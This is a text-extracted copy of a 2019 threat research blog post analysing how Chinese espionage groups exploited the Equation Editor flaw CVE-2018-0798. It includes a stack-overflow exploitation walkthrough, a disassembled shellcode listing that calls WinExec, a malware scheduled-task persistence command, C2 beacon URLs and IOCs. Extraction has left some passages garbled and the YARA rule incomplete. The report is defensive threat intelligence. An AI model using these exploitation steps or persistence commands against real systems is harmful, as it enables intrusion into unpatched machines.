7/4/2019Multiple Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | AnomaliMultiple Chinese Threat Groups Exploiting CVE-2018- 0798 Equation Editor Vulnerability Since Late 2018 anomali.com/blog/multiple-chinese-threat-groups-exploiting-cve-2018-0798-equation-editor-vulnerability-since-late-2018During Anomali Threat Researcher’s tracking of the “Royal Road” Rich Text Format (RTF) weaponizer, commonly used by multiple Chinese threat actors to exploit CVE- 2017-11882 and CVE-2018-0802, it was discovered that multiple Chinese threat groups updated their weaponizer to exploit the Microsoft Equation Editor (EE) vulnerability CVE- 2018-0798 late 2018. We believe the groups moved to use CVE-2018-0798 instead of the other Microsoft Equation Editor Remote Code Execution (RCE) vulnerabilities because the former is more reliable as it works on all known versions of Equation Editor.The analyzed RTF ﬁles share the same object dimension (objw2180\objh300) used to track the RTF weaponizer in our previous report, however, the sample was not exploiting CVE-2017-11882 or CVE-2018-0802. After further analysis, it was discovered that the RTF ﬁles were exploiting the CVE-2018-0798 vulnerability in Microsoft’s Equation Editor (EQNEDT32). CVE-2018-0798 does not appear to be a commonly exploited In The Wild (ITW) even though it is more reliable compared to other well-known EE RCE counterparts,this is mainly because C|VE2018-0798 works with all EE versions while the counterparts are limited to speciﬁc versions. CVE-2017-11882 is only exploitable on an unpatched version prior to its ﬁx, and CVE-2018-0802 is only exploitable on the version released to ﬁx CVE-2017-11882. In contrast, a threat actor utilizing CVE-2018-0798 has a higher chance of success because it is not limited by version.Anomali Researchers were able to identify multiple samples of malicious RTF documents ITW using the same exploit for CVE-2018-0798. Some of the analyzed samples have a creation date of November 19, 2017 (ﬁve days after a patch was released for CVE-2017-11882), however, that date appears to be incorrect because the dropped payloads had a recent compilation timestamps in 2019. The earliest use of theurl Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | Anomaliexploit ITW we were able to identify and conﬁrm is a sample submission of 2018-10-29) with the RTF creation time 2018-10-23.Multiple samples analyzed by Anomali researchers that we associate with CVE-2018- 0798 were also mentioned in previous instances by other researchers in the security community. We believe that some of these were misattributed to CVE-2017-11882 or CVE-2018-0802 when they actually appear to be CVE-2018-0798. Vulnerability and Exploit Analysis CVE-2018-0798 is an RCE vulnerability, a stack buffer overﬂow that can be exploited by a threat actor to perform stack corruption. The vulnerable subroutine is located at the relative virtual address 0x43f6c (sub_443f6c), shown in Figure 1 below. This routine is called by EQNEDT32 when parsing Matrix type records. To note, CVE-2017-11882 and CVE-2018-0802 are vulnerabilities that take place when parsing Font type records. Part of the Matrix record object is copied to a stack buffer without proper bound checks. This allows the threat actor to overﬂow the stack buffer, change the stored return address, and take control of the instruction pointer. Due to the age of this binary, it was compiled and linked in the early 2000s, it does not use any modern protections against stack overﬂows that would have made exploitation much harder.url Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | AnomaliFigure 1 - The vulnerable function before the exploit. The saved return address marked in red is manipulated. Instruction at 0x1283faa copies a byte from the equation object to a stack buffer and return from the call.The write primitive is used to ﬁll the stack with padding 0x60s and 0x61s until the location of the stored return address on the stack. The lower two bytes of the stored return address are changed to 0x0bfb, as depicted in Figure 2. Changing those bytes allows hijackig the control ﬂow when the return address is popped off the stack and into the instruction pointer (EIP). The instruction pointer is then redirected to the return instruction of a function to pop the next value off the stack, located at 0x20ed94 in Figure 2, and into the EIP. This forces the original function argument to be taken as a return address. The argument points to the heap where the equation object has been stored.url Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | AnomaliFigure 2 - The vulnerable function after stack corruption showing calling function return address last two bytes overwritten with x0bfb.EIP lands on a Null sled until it reaches to the shellcode shown below. The shellcode pops the next value on the stack using this value the location of the ﬁnal shellcode is computed.debug017:0051C24D	pop eax debug017:0051C24E	jmp short	loc_51C256 ----------------------------------------------------------------------- debug017:0051C256	add eax,	offset	byte_1BD3C debug017:0051C25B	mov eax,	[eax] debug017:0051C25D	mov eax,	[eax+14h] debug017:0051C260	add eax,	6Dh It resolves the address of WinExec and executes the PowerShell command: powershell.exe Copy-Item "c:\target\Flag.dat" -Destination "C:\pwn”debug017:0052320D	jmp short	sub_523276 ----------------------------------------------------------------------- debug017:00523276	push 'Acor' debug017:0052327B	push 'PteG' debug017:00523280	call Sub_getprocaddr debug017:00523285	push eax debug017:00523286	push 'cex' debug017:0052328B	push 'EniW' debug017:00523290	call Sub_getprocaddr debug017:00523295	push 0 debug017:00523297	xor edx,	edx debug017:00523299	push offset	unk_226E77 debug017:0052329E	push 'p\:C' debug017:005232A3	push '"	no' debug017:005232A8	push 'itan' debug017:005232AD	push 'itse' debug017:005232B2	push 'D-	"' debug017:005232B7	push 'tad.' debug017:005232BC	push 'galF' debug017:005232C1	push '\teg' debug017:005232C6	push 'rat\' debug017:005232CB	push ':c"	' debug017:005232D0	push 'metI' debug017:005232D5	push '-ypo' debug017:005232DA	push 'C	ex' debug017:005232DF	push 'e.ll' debug017:005232E4	push 'ehsr' debug017:005232E9	push 'ewop' debug017:005232EE	mov ecx,	esp debug017:005232F0	push edx debug017:005232F1	push ecx debug017:005232F2	call eax	“winexec” debug017:005232F4	pop edi debug017:005232F5	pop esi debug017:005232F6	pop ebx debug017:005232F7	add esp,	40h debug017:005232FA	cmp ebp,	esp debug017:005232FC	call near	ptr	unk_5233D5 debug017:00523301	mov esp,	ebp debug017:00523303	pop ebp debug017:00523304	retnAs previously mentioned this exploit works on all known versions of Microsoft Equation Editor.url Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | Anomalirule	RTF_Equation_Editor_CVE_2018_0798 version =	"1.0" date =	"2019-05-10" description =	"Detects	Malicious	RTFs	exploiting	CVE-2018-0798" $RTF	at	0	and	$S1 } Figure 3 -Yara rule to detect Malicious RTF exploiting CVE-2018-0798 Threat Actors and Exploit Usage Most of the collected Samples were attributed to the following Chinese Cyber Espionage threat actor:Conimes Temp.TridentHowever,Beginning on 25 June 2019, we started observing multiple commodity campaigns (Mostly dropping AsyncRAT) using the updated RTF weaponizer with the same exploit (CVE-2018-0798). As observed previously with CVE-2017-11882 and CVE- 2018-0802, the weaponizer was used exclusively by Chinese cyber espionage actors for approximately one year (December 2017 through December 2018), after which cybercrime actors began to incorporate it in their malicious activity. This indicates that the weaponizer author is now selling to a wider group of actors.Examples of social engineering lures and malicious document content used with CVE- themed around government for Mongolia. Themed around Russian President Vladimir Putin making a statement on United States’ missiles. Pertains to be a report from the Mongolian Embassy in Japan regarding news about North Korea. A Mongolian-language lure that contains a table with ap‐ parent details of people in‐ cluding email, name, and ian text titled about “Common‐ wealth of Independent States Anti-terrorist Centre”. Titled “Social Security Reform Note”. Discusses demograph‐ ics and social security reform in Brazil. Titled “Foreign Ofﬁce of Viet‐ nam”. Guidance on granting, extending, modifying and sup‐ plementing diplomatic pass‐ ports, ofﬁcial passports and diplomatic note for visa application. In the Vietnamese language that appears to talk about the health of former Member of the Central Party Committee VIII, IX Nguyen Phuc Thanh. In the Vietnamese language that contains instructions for employees before taking a blood test. Lure in the Russian language that is a letter to rector of Russian university. Mongolian lure on topic of training and the United Nations.File name is unavailableТM 30.17.docЦэргийн (List of tele‐ phone num‐ bers to be used in the BNG.docGiay moi hoi nghi.docPV Báo Quốc the current Vietnamese Prime Minister Nguyễn Xuân Phúc Mongolian lure on topic of the Mongolian prime minister visit‐ ing Japan.TB - VPCP.docMedee Bolor ian news about NATO troops leaving Afghanistan. Vietnamese Police-themed applied secu‐ rity studies.rtf QĐ Tổng cục.docSample Documents: mayor of Seoul. Exploitation Methods and payload Analysis: Anomali Threat Researchers identiﬁed multiple exploitation techniques using CVE-2018- 0798 to drop malicious payloads. Some of the observed techniques identiﬁed being used to exploit the vulnerability are as follows: OLE package objects and DLL Sideloading opening the attachment) the document drops OLE package as “8.t” in the %TEMP% directory. The 8.t ﬁle is a dropper and it is encrypted using XOR cipher with encryption key “0xFC”. Upon decrypting and executing, it drops two additional ﬁles “wsc_proxy.exe” (legitimate Avast executable) and a malicious DLL “wsc.dll” in the %TEMP% folder. The dropper then creates a scheduled task to run the executable “wsc_proxy.exe” for every ﬁve minutes as a persistence mechanism.url Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | AnomaliFigure 7: Payloads dropped at %tmp% after the execution of dropper (8.t)Schedule task command: “schtasks /create /sc MINUTE /tn "Avast Antivirus" /tr "C:\Users\Username\AppData\Local\Temp\wsc_proxy.exe" /mo 5 /f”The benign executable “wsc_proxy.exe” gets executed by the scheduled task "Avast Antivirus," and using DLL sideloading the malicious payload “wsc.dll” gets started. The malware attempts to communicate via HTTP to the C2 at vvcxvsdvx.dynamic-dns[.]net over port 2113/TCP.Payload MD5: 9AD1DBA92734A53489180788A6B21856 C2: vvcxvsdvx.dynamic-dns[.]net IP: 185.216.35[.]11 (known Goblin panda C&C) URL: vvcxvsdvx.dynamic-dns[.]net/image/logo.png after the malicious document is opened. The ﬁle 8.t is a malicious executable dropper and encrypted via XOR cipher using the key “0xFC”. On execution it drops two ﬁles “ChromeApp.ps1” and “ChromeApp.vbs” in the directory “C:\Windows\tracing\”. It then creates a scheduled task named “ChromeApp” to execute the Visual Basic Script (VBScript). The VBScript calls the PowerShell script and it beacons out to C2 “185.234.73[.]4” using HTTP to send the victim User ID and receiving further instructions URL: : http:185.234.73[.]4/CApp.php? name=NzI4QTRENTYtMEY0Ny0yQzY3LTY3QzEtQjg0MzNBOUU1Rjgw:VUk= Dropping ‘.wll’ ﬁle in Microsoft Word ‘startup’ folder whe the ﬁle is opened. The shellcode decrypt “8.t” and save it as “%APPDATA%\Microsoft\Word\STARTUP\cclerr.wll”. The next time user opens Microsoft Word, the dropped ﬁle “cclerr.wll” will be loaded and executed in Word’s process memory.During the next run of Microsoft Word, the below activities were observed,1. The cclerr.wll gets copied into “C:\Program Files (x86)\Intel\Intel(R) ProcessorGraphics” as “RasTls.dll”2. The legitimate executable IntelGraphicsController.exe is used to load themalicious “RasTls.dll” via DLL search-order hijacking technique.3. The below list of commands are executed by word.exe (hijacked process)Figure 10: command executions by rogue word.exe process4. Sets the registry key for persistence atHKCU\Software\Microsoft\Windows\CurrentVersion\Run\IntelGraphicsControllerFigure 11: Windows Autorun key set for persistence.5. Drops two batch ﬁles in the %TEMP% folder named as UnIB490.bat &UnIB4A0.bat6. The batch ﬁles are used to clean up the word document and “.wll” ﬁle.Figure 12: Batch script for clearing traces of malicious activities.Payload MD5: B72448AF5F58E70C225AB6525126CF8B %TEMP% directory. The equation editor loads the bin ﬁle directly into its memory space as code and jumps to it. The code in “s.bin” ﬁle extracts and load a DLL. It then creates a directory “C:\Program Files (x86)\pcawhere” and writes a ﬁle named “conﬁg.ini” with a unique identiﬁer for the victim. After successful execution of malicious code, it tries to Conclusion Analysis of the Royal Road weaponizer has resulted in the discovery that multiple Chinese threat groups started utilizing CVE-2018-0798 in their RTF weaponizer. This ﬁnding conﬁrms that the groups, as mentioned in our previous report, are sharing the same exploit supply chain. The groups appear to have been using the Microsoft vulnerability exploit exclusively for approximately six months before it began appearing in commodity-malware campaigns. This may indicate that the Chinese groups sold the exploit after using it in their malicious campaigns.url Chinese Threat Groups Exploiting CVE-2018-0798 Equation Editor Vulnerability Since Late 2018 | AnomaliThese ﬁndings also suggest that the threat groups have robust exploit developing capabilities because CVE-2018-0798 is not widely reported on and it is typically not incorporated into publicly available weaponizers.Threatstream enterprise users can read a more detailed analysis here. IOCs File Hashes (MD5): 185.234.73[.]4 138.68.133[.]211 Vvcxvsdvx.dynamic-dns[.]net loge.otzo[.]comAbout the AuthorAnomali LabsCopyright 2019 ANOMALI. All Rights Reserved.url 